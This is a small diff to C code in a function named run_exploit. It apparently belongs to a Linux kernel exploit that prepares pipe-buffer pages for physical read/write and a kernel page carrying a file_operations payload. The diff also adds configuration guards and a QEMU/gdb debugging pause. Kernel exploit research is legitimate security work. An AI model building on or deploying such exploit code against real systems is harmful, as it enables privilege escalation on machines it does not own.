@@ -457,6 +457,7 @@ int run_exploit(int argc, char **argv) {
   }
   pr_info("fresh fops oracle pipe page=%016zx\n", pipebuf_page_base);
 #else
+#if !defined(APP_FOPS_BEFORE_PIPE) || !APP_FOPS_BEFORE_PIPE
   pipebuf_page_base = prepare_pipe_buffer_page();
   pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
   if (!is_direct_ptr(pipebuf_page_base)) {
@@ -465,11 +466,18 @@ int run_exploit(int argc, char **argv) {
 #endif
 #endif
 #endif
+#endif
 
   pin_to_core(CORE);
 #if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
     !APP_FOPS_REUSE_VERIFIED_PAGE
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+#endif
+
+#ifdef QEMU_FOPS_GDB_HOLD_SECONDS
+  pr_info("qemu fops gdb hold seconds=%d base=%016zx\n",
+          QEMU_FOPS_GDB_HOLD_SECONDS, page_base);
+  sleep(QEMU_FOPS_GDB_HOLD_SECONDS);
 #endif
 
 #ifdef QEMU_GDB_HOLD_SECONDS
